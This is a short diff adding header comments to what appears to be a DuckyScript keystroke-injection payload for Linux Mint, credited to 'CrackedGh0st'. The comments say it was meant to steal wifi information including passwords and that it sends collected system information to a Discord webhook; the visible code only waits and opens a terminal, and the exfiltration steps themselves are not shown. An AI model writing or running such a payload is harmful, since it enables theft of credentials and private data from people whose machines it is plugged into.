@@ -1,3 +1,6 @@
+REM Author- CrackedGh0st
+REM Target- Tested on Linux Mint  
+REM Purpose/Fucntions - Was first attempt at getting all wifi information including password but that didnt work. Still plenty of useful information that is sent to discord webhook 
 DELAY 1000
 CTRL-ALT t
 DELAY 1000
